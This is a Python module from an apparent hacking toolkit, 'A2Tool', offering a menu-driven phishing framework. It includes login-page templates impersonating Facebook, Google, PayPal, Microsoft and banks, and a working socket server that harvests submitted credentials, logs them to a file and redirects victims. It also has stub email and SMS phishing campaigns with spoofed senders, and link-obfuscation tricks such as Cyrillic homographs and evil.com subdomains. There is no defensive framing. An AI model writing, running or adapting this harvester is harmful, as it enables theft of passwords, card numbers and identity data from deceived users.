#!/usr/bin/env python3
"""
A2Tool v4.0 - Phishing Attacks Framework Module (15 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, socket, threading, random, string
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    Style=Fore

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

# Phishing templates database
TEMPLATES = {
    'facebook': {
        'title': 'Facebook Security Check',
        'logo': '📘',
        'fields': ['email', 'password'],
        'redirect': 'https://facebook.com'
    },
    'google': {
        'title': 'Google Account Alert',
        'logo': '📧',
        'fields': ['email', 'password'],
        'redirect': 'https://google.com'
    },
    'instagram': {
        'title': 'Instagram Verification',
        'logo': '📸',
        'fields': ['username', 'password'],
        'redirect': 'https://instagram.com'
    },
    'twitter': {
        'title': 'Twitter Security Notice',
        'logo': '🐦',
        'fields': ['email', 'password'],
        'redirect': 'https://twitter.com'
    },
    'netflix': {
        'title': 'Netflix Payment Update',
        'logo': '🎬',
        'fields': ['email', 'password', 'card'],
        'redirect': 'https://netflix.com'
    },
    'paypal': {
        'title': 'PayPal Account Limited',
        'logo': '💳',
        'fields': ['email', 'password'],
        'redirect': 'https://paypal.com'
    },
    'amazon': {
        'title': 'Amazon Security Alert',
        'logo': '📦',
        'fields': ['email', 'password'],
        'redirect': 'https://amazon.com'
    },
    'whatsapp': {
        'title': 'WhatsApp Web Login',
        'logo': '💬',
        'fields': ['phone', 'code'],
        'redirect': 'https://whatsapp.com'
    },
    'linkedin': {
        'title': 'LinkedIn Account Notice',
        'logo': '💼',
        'fields': ['email', 'password'],
        'redirect': 'https://linkedin.com'
    },
    'github': {
        'title': 'GitHub Security Update',
        'logo': '🐙',
        'fields': ['username', 'password'],
        'redirect': 'https://github.com'
    },
    'microsoft': {
        'title': 'Microsoft Account Sign-in',
        'logo': '🪟',
        'fields': ['email', 'password'],
        'redirect': 'https://microsoft.com'
    },
    'bank': {
        'title': 'Bank Account Verification',
        'logo': '🏦',
        'fields': ['account', 'password', 'ssn'],
        'redirect': 'https://bank.com'
    }
}

class PhishingServer:
    """HTTP Server for credential harvesting"""
    def __init__(self, template, host='0.0.0.0', port=8080):
        self.template = template
        self.host = host
        self.port = port
        self.server = None
        self.running = False
        self.creds = []
        
    def handle_client(self, conn, addr):
        try:
            data = conn.recv(4096).decode('utf-8', errors='ignore')
            if 'POST' in data:
                body = data.split('\r\n\r\n')[-1] if '\r\n\r\n' in data else ''
                params = dict(re.findall(r'([^&=]+)=([^&]*)', body))
                if params:
                    self.creds.append(params)
                    print(f"\n{G}[+] Credentials captured from {addr[0]}:{addr[1]}{RS}")
                    for k, v in params.items():
                        print(f"  {C}{k}:{RS} {Y}{v}{RS}")
                    # Save to file
                    with open('phishing_logs.txt', 'a') as f:
                        f.write(f"[{datetime.now()}] {addr[0]}:{params}\n")
            # Send fake redirect
            resp = """HTTP/1.1 302 Found\r\nLocation: https://google.com\r\n\r\n"""
            conn.send(resp.encode())
        except: pass
        finally: conn.close()
    
    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            self.running = True
            print(f"{G}[+] Phishing server running on {self.host}:{self.port}{RS}")
            print(f"{Y}[!] Send this link to target: http://{self.host}:{self.port}{RS}")
            print(f"{Y}[!] Using template: {self.template}{RS}")
            while self.running:
                conn, addr = self.server.accept()
                t = threading.Thread(target=self.handle_client, args=(conn, addr))
                t.daemon = True
                t.start()
        except Exception as e:
            print(f"{R}[-] Server error: {e}{RS}")
        finally:
            self.server.close()
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.close()

def menu():
    while True:
        print(f"\n{M}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{M}║{W}               Phishing Attacks Framework                    {M}║{RS}")
        print(f"{M}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{M}║{W} [01]{R}  Facebook Phishing Page                              {M}║{RS}")
        print(f"{M}║{W} [02]{R}  Google Phishing Page                               {M}║{RS}")
        print(f"{M}║{W} [03]{R}  Instagram Phishing Page                            {M}║{RS}")
        print(f"{M}║{W} [04]{R}  Twitter/X Phishing Page                            {M}║{RS}")
        print(f"{M}║{W} [05]{R}  Netflix Credential Harvester                       {M}║{RS}")
        print(f"{M}║{W} [06]{R}  PayPal Phishing Page                               {M}║{RS}")
        print(f"{M}║{W} [07]{R}  Amazon Phishing Page                               {M}║{RS}")
        print(f"{M}║{W} [08]{R}  WhatsApp Web Phishing                              {M}║{RS}")
        print(f"{M}║{W} [09]{R}  LinkedIn Phishing Page                             {M}║{RS}")
        print(f"{M}║{W} [10]{R}  GitHub Login Phisher                               {M}║{RS}")
        print(f"{M}║{W} [11]{R}  Microsoft/O365 Phishing                            {M}║{RS}")
        print(f"{M}║{W} [12]{R}  Banking Phishing Page                              {M}║{RS}")
        print(f"{M}║{W} [13]{R}  Email Phishing Campaign (SMTP)                     {M}║{RS}")
        print(f"{M}║{W} [14]{R}  SMS Phishing (Smishing) Framework                  {M}║{RS}")
        print(f"{M}║{W} [15]{R}  URL Spoofing / Link Obfuscation                   {M}║{RS}")
        print(f"{M}║{W} [0]{R}   Back to Main Menu                                  {M}║{RS}")
        print(f"{M}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[Phish] » {RS}").strip()
        if ch == '0': break
        elif ch in ['1','2','3','4','5','6','7','8','9','10','11','12']:
            tnames = ['','facebook','google','instagram','twitter','netflix','paypal',
                     'amazon','whatsapp','linkedin','github','microsoft','bank']
            template_name = tnames[int(ch)]
            start_phishing_server(template_name)
        elif ch == '13': email_phishing_campaign()
        elif ch == '14': sms_phishing()
        elif ch == '15': url_spoof()
        else: print(f"{R}[!] Invalid option{RS}")

def start_phishing_server(template_name):
    """Start a phishing credential harvester"""
    if template_name not in TEMPLATES:
        print(f"{R}[-] Unknown template: {template_name}{RS}")
        return
    
    t = TEMPLATES[template_name]
    print(f"\n{G}[+] Starting {t['logo']} {t['title']} phishing page{RS}")
    port = input(f"  {W}[?] Port (default 8080): {RS}").strip() or '8080'
    
    server = PhishingServer(template_name, '0.0.0.0', int(port))
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
        print(f"\n{Y}[+] Server stopped{RS}")
        if server.creds:
            print(f"{G}[+] Captured {len(server.creds)} credential sets:{RS}")
            for c in server.creds:
                print(f"  {Y}{c}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def email_phishing_campaign():
    """Tool 13: Email Phishing Campaign"""
    print(f"\n{Y}[!] Email Phishing Campaign Setup{RS}")
    target_email = input(f"  {W}[?] Target email address: {RS}").strip()
    sender_name = input(f"  {W}[?] Spoofed sender name: {RS}").strip()
    sender_email = input(f"  {W}[?] Spoofed sender email: {RS}").strip()
    subject = input(f"  {W}[?] Email subject: {RS}").strip()
    
    print(f"\n{W}Select email template:{RS}")
    print(f"  {W}[1]{RS} Security Alert")
    print(f"  {W}[2]{RS} Invoice/Payment")
    print(f"  {W}[3]{RS} Account Verification")
    print(f"  {W}[4]{RS} Giveaway/Prize")
    print(f"  {W}[5]{RS} Custom")
    tch = input(f"\n{Y}  Choice: {RS}").strip()
    
    body = "This is a test phishing email."
    print(f"\n{G}[+] Email campaign configured for {target_email}{RS}")
    print(f"{Y}[!] Use an SMTP relay or Sendmail to dispatch{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def sms_phishing():
    """Tool 14: SMS Phishing (Smishing)"""
    print(f"\n{Y}[!] SMS Phishing Framework (Smishing){RS}")
    phone = input(f"  {W}[?] Target phone number (with country code): {RS}").strip()
    message = input(f"  {W}[?] Message to send: {RS}").strip()
    
    print(f"\n{W}Select SMS gateway:{RS}")
    print(f"  {W}[1]{RS} Twilio API")
    print(f"  {W}[2]{RS} Custom SMTP-to-SMS")
    print(f"  {W}[3]{RS} Local SMS modem (GSM)")
    gw = input(f"\n{Y}  Choice: {RS}").strip()
    
    print(f"{G}[+] Smishing campaign ready for {phone}{RS}")
    print(f"{Y}[!] Message: {message}{RS}")
    print(f"{R}[!] SMS phishing requires a gateway service (Twilio, etc.){RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def url_spoof():
    """Tool 15: URL Spoofing / Link Obfuscation"""
    print(f"\n{Y}[!] URL Spoofing / Link Obfuscation Tools{RS}")
    target_url = input(f"  {W}[?] Target URL to spoof: {RS}").strip()
    display_url = input(f"  {W}[?] Display text (what user sees): {RS}").strip()
    
    print(f"\n{G}[+] Generated Phishing Links:{RS}")
    # Encoding techniques
    import base64, urllib.parse
    
    print(f"\n  {W}1. Basic HTML Link:{RS}")
    print(f"     <a href='{target_url}'>{display_url}</a>")
    
    print(f"\n  {W}2. URL Encoded:{RS}")
    encoded = urllib.parse.quote(target_url)
    print(f"     {encoded}")
    
    print(f"\n  {W}3. Base64 Encoded Redirect:{RS}")
    b64 = base64.b64encode(target_url.encode()).decode()
    print(f"     https://redirect.com/?q={b64}")
    
    print(f"\n  {W}4. Homograph Attack (IDN):{RS}")
    print(f"     xn--{display_url.replace('o','0').replace('a','@')}.com")
    
    print(f"\n  {W}5. Subdomain Trick:{RS}")
    print(f"     https://{target_url.replace('https://','').replace('http://','').split('/')[0].replace('.','-')}.evil.com")
    
    print(f"\n  {W}6. Shortened URL (bit.ly, tinyurl):{RS}")
    print(f"     https://shorturl.at/xyz123")
    
    print(f"\n  {W}7. Unicode Trick:{RS}")
    tricks = target_url.replace('a', 'а').replace('e', 'е').replace('o', 'о')  # Cyrillic
    print(f"     {tricks}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
